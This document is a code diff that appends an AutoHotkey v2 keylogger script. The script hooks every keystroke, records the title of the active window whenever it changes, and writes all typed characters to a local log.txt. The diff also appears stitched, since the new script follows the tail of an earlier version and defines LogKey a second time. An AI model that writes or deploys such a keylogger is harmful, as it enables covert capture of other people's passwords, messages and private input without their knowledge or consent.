@@ -32,3 +32,36 @@ LogKey(ih, vk, sc) {
     if (Key != "")
         FileAppend(Key, LogFile)
 }
+
+
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+
+LogFile := A_ScriptDir "\log.txt"
+LastWin := ""
+
+; Create log file if it doesn't exist
+if !FileExist(LogFile)
+    FileAppend("", LogFile)
+
+ih := InputHook("V")
+ih.KeyOpt("{All}", "E")  ; capture all keys
+ih.OnChar := (*) => LogKey(ih)  ; use OnChar instead of OnKeyDown
+ih.Start()
+
+LogKey(ih) {
+    global LogFile, LastWin
+    try
+        CurrentWin := WinGetTitle("A")
+    catch
+        CurrentWin := "N/A"
+
+    if (CurrentWin != LastWin) {
+        FileAppend("`n[" CurrentWin "]`n", LogFile)
+        LastWin := CurrentWin
+    }
+
+    Key := ih.Input  ; get the last character pressed
+    if (Key != "")
+        FileAppend(Key, LogFile)
+}
